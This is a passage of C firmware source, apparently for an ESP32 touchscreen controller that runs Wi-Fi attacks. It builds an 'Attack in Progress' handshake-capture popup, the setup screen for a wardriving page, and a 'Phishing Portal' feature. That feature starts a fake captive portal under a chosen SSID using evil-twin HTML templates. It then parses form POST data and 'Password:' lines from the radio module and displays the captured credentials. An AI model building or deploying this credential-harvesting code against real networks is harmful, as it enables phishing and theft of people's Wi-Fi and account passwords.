    ctx->global_handshaker_popup = lv_obj_create(ctx->global_handshaker_popup_overlay);
    lv_obj_set_size(ctx->global_handshaker_popup, 520, 420);
    lv_obj_center(ctx->global_handshaker_popup);
    lv_obj_set_style_bg_color(ctx->global_handshaker_popup, lv_color_hex(0x1A1A2A), 0);
    lv_obj_set_style_border_color(ctx->global_handshaker_popup, COLOR_MATERIAL_AMBER, 0);
    lv_obj_set_style_border_width(ctx->global_handshaker_popup, 3, 0);
    lv_obj_set_style_radius(ctx->global_handshaker_popup, 16, 0);
    lv_obj_set_style_shadow_width(ctx->global_handshaker_popup, 30, 0);
    lv_obj_set_style_shadow_color(ctx->global_handshaker_popup, lv_color_hex(0x000000), 0);
    lv_obj_set_style_shadow_opa(ctx->global_handshaker_popup, LV_OPA_50, 0);
    lv_obj_set_style_pad_all(ctx->global_handshaker_popup, 20, 0);
    lv_obj_set_flex_flow(ctx->global_handshaker_popup, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(ctx->global_handshaker_popup, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_row(ctx->global_handshaker_popup, 12, 0);
    lv_obj_clear_flag(ctx->global_handshaker_popup, LV_OBJ_FLAG_SCROLLABLE);
    
    // Download icon
    lv_obj_t *icon_label = lv_label_create(ctx->global_handshaker_popup);
    lv_label_set_text(icon_label, LV_SYMBOL_DOWNLOAD);
    lv_obj_set_style_text_font(icon_label, &lv_font_montserrat_44, 0);
    lv_obj_set_style_text_color(icon_label, COLOR_MATERIAL_AMBER, 0);
    
    // Attack in progress title
    lv_obj_t *title = lv_label_create(ctx->global_handshaker_popup);
    lv_label_set_text(title, "Attack in Progress");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_24, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_AMBER, 0);
    
    // Scrollable log container for handshake status messages
    ctx->global_handshaker_log_container = lv_obj_create(ctx->global_handshaker_popup);
    lv_obj_set_size(ctx->global_handshaker_log_container, lv_pct(100), 150);
    lv_obj_set_style_bg_color(ctx->global_handshaker_log_container, lv_color_hex(0x151520), 0);
    lv_obj_set_style_border_width(ctx->global_handshaker_log_container, 1, 0);
    lv_obj_set_style_border_color(ctx->global_handshaker_log_container, lv_color_hex(0x333344), 0);
    lv_obj_set_style_radius(ctx->global_handshaker_log_container, 8, 0);
    lv_obj_set_style_pad_all(ctx->global_handshaker_log_container, 10, 0);
    lv_obj_set_scroll_dir(ctx->global_handshaker_log_container, LV_DIR_VER);
    lv_obj_set_scrollbar_mode(ctx->global_handshaker_log_container, LV_SCROLLBAR_MODE_AUTO);
    
    // Status label inside the log container (multi-line)
    ctx->global_handshaker_status_label = lv_label_create(ctx->global_handshaker_log_container);
    lv_label_set_text(ctx->global_handshaker_status_label, "Waiting for handshakes...");
    lv_obj_set_width(ctx->global_handshaker_status_label, lv_pct(100));
    lv_label_set_long_mode(ctx->global_handshaker_status_label, LV_LABEL_LONG_WRAP);
    lv_obj_set_style_text_font(ctx->global_handshaker_status_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(ctx->global_handshaker_status_label, lv_color_hex(0xAAAAAA), 0);
    
    // Clear log buffer
    ctx->global_handshaker_log_buffer[0] = '\0';
    
    // Stop button
    lv_obj_t *stop_btn = lv_btn_create(ctx->global_handshaker_popup);
    lv_obj_set_size(stop_btn, 180, 55);
    lv_obj_set_style_bg_color(stop_btn, COLOR_MATERIAL_AMBER, 0);
    lv_obj_set_style_radius(stop_btn, 8, 0);
    lv_obj_add_event_cb(stop_btn, global_handshaker_stop_cb, LV_EVENT_CLICKED, ctx);
    
    lv_obj_t *stop_label = lv_label_create(stop_btn);
    lv_label_set_text(stop_label, LV_SYMBOL_STOP " Stop");
    lv_obj_set_style_text_font(stop_label, &lv_font_montserrat_20, 0);
    lv_obj_center(stop_label);
    
    // Start monitoring task with context
    ctx->global_handshaker_monitoring = true;
    xTaskCreate(global_handshaker_monitor_task, "gh_monitor", 4096, (void*)ctx, 5, &ctx->global_handshaker_task);
}

//==================================================================================
// Phishing Portal Attack Popup
//==================================================================================

// Close phishing portal popup helper
static void close_phishing_portal_popup_ctx(tab_context_t *ctx)
{
    if (!ctx) return;
    bool was_monitoring = ctx->phishing_portal_monitoring;
    // Stop monitoring task first
    ctx->phishing_portal_monitoring = false;
    if (ctx->phishing_portal_task != NULL) {
        vTaskDelay(pdMS_TO_TICKS(100));  // Give task time to exit
        ctx->phishing_portal_task = NULL;
    }

    // Send stop command to current tab UART when closing active portal popup
    if (was_monitoring) {
        tab_id_t active_tab = tab_id_for_ctx(ctx);
        if (!tab_is_internal(active_tab)) {
            uart_port_t uart_port = uart_port_for_tab(active_tab);
            transport_write_bytes_tab(active_tab, uart_port, "stop", 4);
            transport_write_bytes_tab(active_tab, uart_port, "\r\n", 2);
            ESP_LOGI(TAG, "[%s/Tab] Sent command: stop", tab_transport_name(active_tab));
        }
    }
    
    if (ctx->phishing_portal_popup_overlay) {
        lv_obj_del(ctx->phishing_portal_popup_overlay);
        ctx->phishing_portal_popup_overlay = NULL;
        ctx->phishing_portal_popup = NULL;
        ctx->phishing_portal_ssid_textarea = NULL;
        ctx->phishing_portal_keyboard = NULL;
        ctx->phishing_portal_html_dropdown = NULL;
        ctx->phishing_portal_status_label = NULL;
        ctx->phishing_portal_data_label = NULL;
    }
}

// Callback when user clicks Cancel on setup popup
static void phishing_portal_close_cb(lv_event_t *e)
{
    tab_context_t *ctx = (tab_context_t *)lv_event_get_user_data(e);
    if (!ctx) ctx = get_current_ctx();
    ESP_LOGI(TAG, "Phishing Portal cancelled");
    close_phishing_portal_popup_ctx(ctx);
}

// Callback when user clicks Stop during active portal
static void phishing_portal_stop_cb(lv_event_t *e)
{
    tab_context_t *ctx = (tab_context_t *)lv_event_get_user_data(e);
    if (!ctx) ctx = get_current_ctx();
    ESP_LOGI(TAG, "Phishing Portal stopped");
    
    // Close popup
    close_phishing_portal_popup_ctx(ctx);
    
    // Return to main screen
    show_main_tiles();
}

static void update_phishing_portal_capture(tab_context_t *ctx, const char *captured_text)
{
    if (!ctx || captured_text == NULL || captured_text[0] == '\0') {
        return;
    }

    ctx->phishing_portal_submit_count++;

    char status_msg[64];
    snprintf(status_msg, sizeof(status_msg), "Submitted forms: %d", ctx->phishing_portal_submit_count);

    char data_msg[256];
    snprintf(data_msg, sizeof(data_msg), "Last captured: %s", captured_text);

    ESP_LOGI(TAG, "Portal captured: %s", captured_text);

    // Update UI
    bsp_display_lock(0);
    if (ctx->phishing_portal_status_label) {
        lv_label_set_text(ctx->phishing_portal_status_label, status_msg);
    }
    if (ctx->phishing_portal_data_label) {
        lv_label_set_text(ctx->phishing_portal_data_label, data_msg);
        lv_obj_set_style_text_color(ctx->phishing_portal_data_label, COLOR_MATERIAL_GREEN, 0);
    }
    bsp_display_unlock();
}

static void trim_trailing_whitespace(char *s)
{
    if (!s) return;
    size_t len = strlen(s);
    while (len > 0 && isspace((unsigned char)s[len - 1])) {
        s[--len] = '\0';
    }
}

static int hex_to_nibble(char c)
{
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return 10 + (c - 'a');
    if (c >= 'A' && c <= 'F') return 10 + (c - 'A');
    return -1;
}

static void url_decode_segment(const char *src, size_t len, char *dst, size_t dst_size)
{
    size_t di = 0;
    for (size_t i = 0; i < len && di + 1 < dst_size; i++) {
        char c = src[i];
        if (c == '+') {
            c = ' ';
        } else if (c == '%' && i + 2 < len) {
            int hi = hex_to_nibble(src[i + 1]);
            int lo = hex_to_nibble(src[i + 2]);
            if (hi >= 0 && lo >= 0) {
                c = (char)((hi << 4) | lo);
                i += 2;
            }
        }
        dst[di++] = c;
    }
    dst[di] = '\0';
}

static bool parse_post_data(const char *post_data, char *out, size_t out_size)
{
    if (!post_data || !*post_data || out_size == 0) {
        if (out_size > 0) out[0] = '\0';
        return false;
    }

    out[0] = '\0';
    size_t out_len = 0;

    const char *p = post_data;
    while (*p) {
        const char *amp = strchr(p, '&');
        const char *eq = strchr(p, '=');

        const char *token_end = amp ? amp : (p + strlen(p));
        const char *key_end = (eq && eq < token_end) ? eq : token_end;
        const char *val_start = (eq && eq < token_end) ? (eq + 1) : token_end;

        char key[64];
        char val[128];

        url_decode_segment(p, (size_t)(key_end - p), key, sizeof(key));
        url_decode_segment(val_start, (size_t)(token_end - val_start), val, sizeof(val));

        if (key[0] != '\0') {
            int written = 0;
            if (val[0] != '\0') {
                written = snprintf(out + out_len, out_size - out_len,
                    "%s%s=%s", (out_len > 0 ? ", " : ""), key, val);
            } else {
                written = snprintf(out + out_len, out_size - out_len,
                    "%s%s", (out_len > 0 ? ", " : ""), key);
            }

            if (written < 0 || (size_t)written >= out_size - out_len) {
                out[out_size - 1] = '\0';
                break;
            }
            out_len += (size_t)written;
        }

        if (!amp) break;
        p = amp + 1;
    }

    return out_len > 0;
}

// Phishing portal monitor task - reads UART for form submissions
static void phishing_portal_monitor_task(void *arg)
{
    tab_context_t *ctx = (tab_context_t *)arg;
    if (!ctx) {
        vTaskDelete(NULL);
        return;
    }
    ESP_LOGI(TAG, "Phishing Portal monitor task started");
    
    tab_id_t portal_tab = tab_id_for_ctx(ctx);
    uart_port_t uart_port = uart_port_for_tab(portal_tab);
    char rx_buffer[512];
    char line_buffer[512];
    int line_pos = 0;

    ESP_LOGI(TAG, "Portal monitor using tab=%s, uart=%d", tab_transport_name(portal_tab), uart_port);
    
    while (ctx->phishing_portal_monitoring) {
        int len = transport_read_bytes_tab(portal_tab, uart_port, rx_buffer, sizeof(rx_buffer) - 1, pdMS_TO_TICKS(100));
        
        if (len > 0) {
            rx_buffer[len] = '\0';
            ESP_LOGI(TAG, "Portal monitor RX (%d bytes): %s", len, rx_buffer);
            
            for (int i = 0; i < len; i++) {
                char c = rx_buffer[i];
                
                if (c == '\n' || c == '\r') {
                    if (line_pos > 0) {
                        line_buffer[line_pos] = '\0';
                        ESP_LOGI(TAG, "Portal monitor line: %s", line_buffer);
                        
                        // Check for password/form data capture
                        // Pattern: "Received POST data: ..." or "Portal password received: ..." or "Password: ..."
                        char *post_ptr = strstr(line_buffer, "Received POST data:");
                        if (post_ptr != NULL) {
                            char *value_start = post_ptr + strlen("Received POST data:");
                            while (*value_start == ' ') value_start++;

                            char parsed[256];
                            if (parse_post_data(value_start, parsed, sizeof(parsed))) {
                                trim_trailing_whitespace(parsed);
                                update_phishing_portal_capture(ctx, parsed);
                            } else if (value_start[0] != '\0') {
                                char fallback[256];
                                snprintf(fallback, sizeof(fallback), "%s", value_start);
                                trim_trailing_whitespace(fallback);
                                update_phishing_portal_capture(ctx, fallback);
                            }
                        } else {
                            char *password_ptr = strstr(line_buffer, "Portal password received:");
                            int skip_len = 25;  // Length of "Portal password received: "
                            if (password_ptr == NULL) {
                                password_ptr = strstr(line_buffer, "Password:");
                                skip_len = 9;  // Length of "Password: "
                            }

                            if (password_ptr != NULL) {
                                char *value_start = password_ptr + skip_len;
                                while (*value_start == ' ') value_start++;

                                char capture[192];
                                snprintf(capture, sizeof(capture), "password=%s", value_start);
                                trim_trailing_whitespace(capture);
                                update_phishing_portal_capture(ctx, capture);
                            }
                        }
                        
                        // Check for client connection
                        if (strstr(line_buffer, "Client connected") != NULL) {
                            ESP_LOGI(TAG, "Portal: %s", line_buffer);
                        }
                        
                        // Check for portal data saved
                        if (strstr(line_buffer, "Portal data saved") != NULL) {
                            ESP_LOGI(TAG, "Portal data saved to file");
                        }
                        
                        line_pos = 0;
                    }
                } else if (line_pos < (int)sizeof(line_buffer) - 1) {
                    line_buffer[line_pos++] = c;
                }
            }
        }
        
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    
    ESP_LOGI(TAG, "Phishing Portal monitor task ended");
    ctx->phishing_portal_task = NULL;
    vTaskDelete(NULL);
}

// Show active portal popup
static void show_phishing_portal_active_popup(tab_context_t *ctx)
{
    if (!ctx) return;
    if (ctx->phishing_portal_popup != NULL) return;
    
    lv_obj_t *container = get_current_tab_container();
    if (!container) return;
    
    // Reset submit count
    ctx->phishing_portal_submit_count = 0;
    
    // Create modal overlay
    ctx->phishing_portal_popup_overlay = lv_obj_create(container);
    lv_obj_remove_style_all(ctx->phishing_portal_popup_overlay);
    lv_obj_set_size(ctx->phishing_portal_popup_overlay, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(ctx->phishing_portal_popup_overlay, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(ctx->phishing_portal_popup_overlay, LV_OPA_70, 0);
    lv_obj_clear_flag(ctx->phishing_portal_popup_overlay, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_add_flag(ctx->phishing_portal_popup_overlay, LV_OBJ_FLAG_CLICKABLE);
    
    // Create popup
    ctx->phishing_portal_popup = lv_obj_create(ctx->phishing_portal_popup_overlay);
    lv_obj_set_size(ctx->phishing_portal_popup, 500, 380);
    lv_obj_center(ctx->phishing_portal_popup);
    lv_obj_set_style_bg_color(ctx->phishing_portal_popup, lv_color_hex(0x1A1A2A), 0);
    lv_obj_set_style_border_color(ctx->phishing_portal_popup, COLOR_MATERIAL_ORANGE, 0);
    lv_obj_set_style_border_width(ctx->phishing_portal_popup, 3, 0);
    lv_obj_set_style_radius(ctx->phishing_portal_popup, 16, 0);
    lv_obj_set_style_shadow_width(ctx->phishing_portal_popup, 30, 0);
    lv_obj_set_style_shadow_color(ctx->phishing_portal_popup, lv_color_hex(0x000000), 0);
    lv_obj_set_style_shadow_opa(ctx->phishing_portal_popup, LV_OPA_50, 0);
    lv_obj_set_style_pad_all(ctx->phishing_portal_popup, 20, 0);
    lv_obj_set_flex_flow(ctx->phishing_portal_popup, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(ctx->phishing_portal_popup, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_row(ctx->phishing_portal_popup, 16, 0);
    lv_obj_clear_flag(ctx->phishing_portal_popup, LV_OBJ_FLAG_SCROLLABLE);
    
    // WiFi icon
    lv_obj_t *icon_label = lv_label_create(ctx->phishing_portal_popup);
    lv_label_set_text(icon_label, LV_SYMBOL_WIFI);
    lv_obj_set_style_text_font(icon_label, &lv_font_montserrat_44, 0);
    lv_obj_set_style_text_color(icon_label, COLOR_MATERIAL_ORANGE, 0);
    
    // Title with SSID
    lv_obj_t *title = lv_label_create(ctx->phishing_portal_popup);
    char title_text[128];
    snprintf(title_text, sizeof(title_text), "Portal Active: %s", ctx->phishing_portal_ssid);
    lv_label_set_text(title, title_text);
    lv_obj_set_style_text_font(title, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_ORANGE, 0);
    
    // Status label (submitted forms count)
    ctx->phishing_portal_status_label = lv_label_create(ctx->phishing_portal_popup);
    lv_label_set_text(ctx->phishing_portal_status_label, "Submitted forms: 0");
    lv_obj_set_style_text_font(ctx->phishing_portal_status_label, &lv_font_montserrat_18, 0);
    lv_obj_set_style_text_color(ctx->phishing_portal_status_label, lv_color_hex(0xCCCCCC), 0);
    
    // Data label (last captured data)
    ctx->phishing_portal_data_label = lv_label_create(ctx->phishing_portal_popup);
    lv_label_set_text(ctx->phishing_portal_data_label, "Last captured: --");
    lv_obj_set_style_text_font(ctx->phishing_portal_data_label, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(ctx->phishing_portal_data_label, lv_color_hex(0x888888), 0);
    lv_obj_set_style_text_align(ctx->phishing_portal_data_label, LV_TEXT_ALIGN_CENTER, 0);
    lv_obj_set_width(ctx->phishing_portal_data_label, lv_pct(90));
    lv_label_set_long_mode(ctx->phishing_portal_data_label, LV_LABEL_LONG_WRAP);
    
    // Stop button
    lv_obj_t *stop_btn = lv_btn_create(ctx->phishing_portal_popup);
    lv_obj_set_size(stop_btn, 180, 55);
    lv_obj_set_style_bg_color(stop_btn, COLOR_MATERIAL_ORANGE, 0);
    lv_obj_set_style_radius(stop_btn, 8, 0);
    lv_obj_add_event_cb(stop_btn, phishing_portal_stop_cb, LV_EVENT_CLICKED, ctx);
    
    lv_obj_t *stop_label = lv_label_create(stop_btn);
    lv_label_set_text(stop_label, LV_SYMBOL_STOP " Stop");
    lv_obj_set_style_text_font(stop_label, &lv_font_montserrat_20, 0);
    lv_obj_center(stop_label);
    
    // Start monitoring task
    ctx->phishing_portal_monitoring = true;
    xTaskCreate(phishing_portal_monitor_task, "pp_monitor", 4096, ctx, 5, &ctx->phishing_portal_task);
}

// Phishing Portal actual start logic
static void do_phishing_portal_start(tab_context_t *ctx)
{
    if (!ctx) return;
    // Get SSID from textarea
    const char *ssid = lv_textarea_get_text(ctx->phishing_portal_ssid_textarea);
    if (ssid == NULL || strlen(ssid) == 0) {
        ESP_LOGW(TAG, "SSID is empty");
        return;
    }
    
    // Save SSID for display
    strncpy(ctx->phishing_portal_ssid, ssid, sizeof(ctx->phishing_portal_ssid) - 1);
    ctx->phishing_portal_ssid[sizeof(ctx->phishing_portal_ssid) - 1] = '\0';
    
    // Get selected HTML index
    int html_idx = lv_dropdown_get_selected(ctx->phishing_portal_html_dropdown);
    html_idx++;  // Convert to 1-based index for command
    
    ESP_LOGI(TAG, "Starting Phishing Portal - SSID: %s, HTML index converted: %d", ctx->phishing_portal_ssid, html_idx);
    
    // Close setup popup first
    close_phishing_portal_popup_ctx(ctx);
    
    // Send commands to current tab's UART
    char cmd[128];
    snprintf(cmd, sizeof(cmd), "select_html %d", html_idx);
    uart_send_command_for_tab(cmd);
    vTaskDelay(pdMS_TO_TICKS(100));
    
    snprintf(cmd, sizeof(cmd), "start_portal \"%s\"", ctx->phishing_portal_ssid);
    uart_send_command_for_tab(cmd);
    
    // Show active popup
    show_phishing_portal_active_popup(ctx);
}

// Callback when user clicks OK to start portal
static void phishing_portal_start_cb(lv_event_t *e)
{
    (void)e;
    tab_context_t *ctx = get_current_ctx();
    // SD check is done before opening popup, so we can start directly
    do_phishing_portal_start(ctx);
}

// Keyboard event handler - hide keyboard when done
static void phishing_portal_keyboard_cb(lv_event_t *e)
{
    lv_event_code_t code = lv_event_get_code(e);
    lv_obj_t *kb = lv_event_get_target(e);
    tab_context_t *ctx = (tab_context_t *)lv_event_get_user_data(e);
    if (!ctx) ctx = get_current_ctx();
    
    if (code == LV_EVENT_READY || code == LV_EVENT_CANCEL) {
        lv_obj_add_flag(kb, LV_OBJ_FLAG_HIDDEN);
        if (ctx && ctx->phishing_portal_ssid_textarea) {
            lv_keyboard_set_textarea(kb, ctx->phishing_portal_ssid_textarea);
        }
    }
}

// Textarea focus handler - show keyboard when focused
static void phishing_portal_textarea_focus_cb(lv_event_t *e)
{
    lv_event_code_t code = lv_event_get_code(e);
    tab_context_t *ctx = (tab_context_t *)lv_event_get_user_data(e);
    if (!ctx) ctx = get_current_ctx();
    
    if (code == LV_EVENT_FOCUSED) {
        if (ctx && ctx->phishing_portal_keyboard) {
            lv_keyboard_set_textarea(ctx->phishing_portal_keyboard, ctx->phishing_portal_ssid_textarea);
            lv_obj_clear_flag(ctx->phishing_portal_keyboard, LV_OBJ_FLAG_HIDDEN);
        }
    } else if (code == LV_EVENT_DEFOCUSED) {
        if (ctx && ctx->phishing_portal_keyboard) {
            lv_obj_add_flag(ctx->phishing_portal_keyboard, LV_OBJ_FLAG_HIDDEN);
        }
    }
}

// Show phishing portal setup popup
static void show_phishing_portal_popup(void)
{
    tab_context_t *ctx = get_current_ctx();
    if (!ctx) return;
    if (ctx->phishing_portal_popup != NULL) return;
    
    // Show loading overlay while fetching HTML files
    show_evil_twin_loading_overlay();
    lv_refr_now(NULL);
    
    // Fetch HTML files from SD (reuse evil twin's array)
    fetch_html_files_from_sd();
    
    // Hide loading overlay
    hide_evil_twin_loading_overlay();
    
    if (evil_twin_html_count == 0) {
        ESP_LOGW(TAG, "No HTML files found on SD card");
        return;
    }
    
    lv_obj_t *container = get_current_tab_container();
    if (!container) return;
    
    // Create modal overlay
    ctx->phishing_portal_popup_overlay = lv_obj_create(container);
    lv_obj_remove_style_all(ctx->phishing_portal_popup_overlay);
    lv_obj_set_size(ctx->phishing_portal_popup_overlay, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(ctx->phishing_portal_popup_overlay, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(ctx->phishing_portal_popup_overlay, LV_OPA_50, 0);
    lv_obj_clear_flag(ctx->phishing_portal_popup_overlay, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_add_flag(ctx->phishing_portal_popup_overlay, LV_OBJ_FLAG_CLICKABLE);
    
    // Create popup
    ctx->phishing_portal_popup = lv_obj_create(ctx->phishing_portal_popup_overlay);
    lv_obj_set_size(ctx->phishing_portal_popup, 600, 480);
    lv_obj_center(ctx->phishing_portal_popup);
    lv_obj_set_style_bg_color(ctx->phishing_portal_popup, lv_color_hex(0x1A1A2A), 0);
    lv_obj_set_style_border_color(ctx->phishing_portal_popup, COLOR_MATERIAL_ORANGE, 0);
    lv_obj_set_style_border_width(ctx->phishing_portal_popup, 2, 0);
    lv_obj_set_style_radius(ctx->phishing_portal_popup, 16, 0);
    lv_obj_set_style_shadow_width(ctx->phishing_portal_popup, 30, 0);
    lv_obj_set_style_shadow_color(ctx->phishing_portal_popup, lv_color_hex(0x000000), 0);
    lv_obj_set_style_shadow_opa(ctx->phishing_portal_popup, LV_OPA_50, 0);
    lv_obj_set_style_pad_all(ctx->phishing_portal_popup, 16, 0);
    lv_obj_set_flex_flow(ctx->phishing_portal_popup, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(ctx->phishing_portal_popup, 12, 0);
    lv_obj_clear_flag(ctx->phishing_portal_popup, LV_OBJ_FLAG_SCROLLABLE);
    
    // Title
    lv_obj_t *title = lv_label_create(ctx->phishing_portal_popup);
    lv_label_set_text(title, LV_SYMBOL_WIFI " Phishing Portal");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_22, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_ORANGE, 0);
    
    // SSID label
    lv_obj_t *ssid_label = lv_label_create(ctx->phishing_portal_popup);
    lv_label_set_text(ssid_label, "Enter SSID:");
    lv_obj_set_style_text_font(ssid_label, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(ssid_label, lv_color_hex(0xCCCCCC), 0);
    
    // SSID textarea
    ctx->phishing_portal_ssid_textarea = lv_textarea_create(ctx->phishing_portal_popup);
    lv_obj_set_size(ctx->phishing_portal_ssid_textarea, lv_pct(90), 45);
    lv_textarea_set_placeholder_text(ctx->phishing_portal_ssid_textarea, "WiFi Network Name");
    lv_textarea_set_one_line(ctx->phishing_portal_ssid_textarea, true);
    lv_textarea_set_max_length(ctx->phishing_portal_ssid_textarea, 32);
    lv_obj_set_style_bg_color(ctx->phishing_portal_ssid_textarea, lv_color_hex(0x2A2A3A), 0);
    lv_obj_set_style_border_color(ctx->phishing_portal_ssid_textarea, COLOR_MATERIAL_ORANGE, 0);
    lv_obj_set_style_text_color(ctx->phishing_portal_ssid_textarea, lv_color_hex(0xFFFFFF), 0);
    lv_obj_add_event_cb(ctx->phishing_portal_ssid_textarea, phishing_portal_textarea_focus_cb, LV_EVENT_ALL, ctx);
    
    // HTML file label
    lv_obj_t *html_label = lv_label_create(ctx->phishing_portal_popup);
    lv_label_set_text(html_label, "Select Portal HTML:");
    lv_obj_set_style_text_font(html_label, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(html_label, lv_color_hex(0xCCCCCC), 0);
    
    // HTML dropdown (reuse evil twin's file list)
    ctx->phishing_portal_html_dropdown = lv_dropdown_create(ctx->phishing_portal_popup);
    lv_obj_set_size(ctx->phishing_portal_html_dropdown, lv_pct(90), LV_SIZE_CONTENT);
    lv_obj_set_style_bg_color(ctx->phishing_portal_html_dropdown, lv_color_hex(0x2A2A3A), 0);
    lv_obj_set_style_border_color(ctx->phishing_portal_html_dropdown, COLOR_MATERIAL_ORANGE, 0);
    lv_obj_set_style_text_color(ctx->phishing_portal_html_dropdown, lv_color_hex(0xFFFFFF), 0);
    
    // Build dropdown options from evil_twin_html_files
    static char html_options[1024];
    html_options[0] = '\0';
    for (int i = 0; i < evil_twin_html_count; i++) {
        if (i > 0) strcat(html_options, "\n");
        strcat(html_options, evil_twin_html_files[i]);
    }
    lv_dropdown_set_options(ctx->phishing_portal_html_dropdown, html_options);
    
    // Button container
    lv_obj_t *btn_container = lv_obj_create(ctx->phishing_portal_popup);
    lv_obj_remove_style_all(btn_container);
    lv_obj_set_size(btn_container, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_flex_flow(btn_container, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(btn_container, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(btn_container, 20, 0);
    lv_obj_set_style_pad_top(btn_container, 10, 0);
    
    // Cancel button
    lv_obj_t *cancel_btn = lv_btn_create(btn_container);
    lv_obj_set_size(cancel_btn, 120, 45);
    lv_obj_set_style_bg_color(cancel_btn, lv_color_hex(0x444444), 0);
    lv_obj_set_style_radius(cancel_btn, 8, 0);
    lv_obj_add_event_cb(cancel_btn, phishing_portal_close_cb, LV_EVENT_CLICKED, ctx);
    
    lv_obj_t *cancel_label = lv_label_create(cancel_btn);
    lv_label_set_text(cancel_label, "Cancel");
    lv_obj_set_style_text_font(cancel_label, &lv_font_montserrat_16, 0);
    lv_obj_center(cancel_label);
    
    // OK button
    lv_obj_t *ok_btn = lv_btn_create(btn_container);
    lv_obj_set_size(ok_btn, 120, 45);
    lv_obj_set_style_bg_color(ok_btn, COLOR_MATERIAL_ORANGE, 0);
    lv_obj_set_style_radius(ok_btn, 8, 0);
    lv_obj_add_event_cb(ok_btn, phishing_portal_start_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *ok_label = lv_label_create(ok_btn);
    lv_label_set_text(ok_label, "Start");
    lv_obj_set_style_text_font(ok_label, &lv_font_montserrat_16, 0);
    lv_obj_center(ok_label);
    
    // Create keyboard (hidden by default)
    ctx->phishing_portal_keyboard = lv_keyboard_create(ctx->phishing_portal_popup_overlay);
    lv_obj_set_size(ctx->phishing_portal_keyboard, lv_pct(100), 260);  // Larger keys
    lv_obj_align(ctx->phishing_portal_keyboard, LV_ALIGN_BOTTOM_MID, 0, 0);
    lv_keyboard_set_textarea(ctx->phishing_portal_keyboard, ctx->phishing_portal_ssid_textarea);
    lv_obj_add_event_cb(ctx->phishing_portal_keyboard, phishing_portal_keyboard_cb, LV_EVENT_ALL, ctx);
    lv_obj_add_flag(ctx->phishing_portal_keyboard, LV_OBJ_FLAG_HIDDEN);
}

//==================================================================================
// Wardrive Page (full page with Start/Stop, GPS overlay, network table)
//==================================================================================

// Close GPS fix overlay helper
static void close_wardrive_gps_overlay(tab_context_t *ctx)
{
    if (!ctx) return;
    if (ctx->wardrive_gps_overlay) {
        lv_obj_del(ctx->wardrive_gps_overlay);
        ctx->wardrive_gps_overlay = NULL;
        ctx->wardrive_gps_popup = NULL;
        ctx->wardrive_gps_label = NULL;
    }
}

// Show GPS fix waiting overlay on top of wardrive page
static void show_wardrive_gps_overlay(tab_context_t *ctx)
{
    if (!ctx || !ctx->wardrive_page) return;
    close_wardrive_gps_overlay(ctx);

    // Semi-transparent overlay covering the wardrive page
    ctx->wardrive_gps_overlay = lv_obj_create(ctx->wardrive_page);
    lv_obj_remove_style_all(ctx->wardrive_gps_overlay);
    lv_obj_set_size(ctx->wardrive_gps_overlay, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(ctx->wardrive_gps_overlay, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(ctx->wardrive_gps_overlay, LV_OPA_70, 0);
    lv_obj_clear_flag(ctx->wardrive_gps_overlay, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_add_flag(ctx->wardrive_gps_overlay, LV_OBJ_FLAG_CLICKABLE);

    // Small centered popup card
    ctx->wardrive_gps_popup = lv_obj_create(ctx->wardrive_gps_overlay);
    lv_obj_set_size(ctx->wardrive_gps_popup, 420, 220);
    lv_obj_center(ctx->wardrive_gps_popup);
    lv_obj_set_style_bg_color(ctx->wardrive_gps_popup, lv_color_hex(0x1A1A2A), 0);
    lv_obj_set_style_border_color(ctx->wardrive_gps_popup, COLOR_MATERIAL_TEAL, 0);
    lv_obj_set_style_border_width(ctx->wardrive_gps_popup, 3, 0);
    lv_obj_set_style_radius(ctx->wardrive_gps_popup, 16, 0);
    lv_obj_set_style_shadow_width(ctx->wardrive_gps_popup, 30, 0);
    lv_obj_set_style_shadow_color(ctx->wardrive_gps_popup, lv_color_hex(0x000000), 0);
    lv_obj_set_style_shadow_opa(ctx->wardrive_gps_popup, LV_OPA_50, 0);
    lv_obj_set_style_pad_all(ctx->wardrive_gps_popup, 20, 0);
    lv_obj_set_flex_flow(ctx->wardrive_gps_popup, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(ctx->wardrive_gps_popup, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_row(ctx->wardrive_gps_popup, 12, 0);
    lv_obj_clear_flag(ctx->wardrive_gps_popup, LV_OBJ_FLAG_SCROLLABLE);

    // GPS icon
    lv_obj_t *icon_label = lv_label_create(ctx->wardrive_gps_popup);
    lv_label_set_text(icon_label, LV_SYMBOL_GPS);
    lv_obj_set_style_text_font(icon_label, &lv_font_montserrat_44, 0);
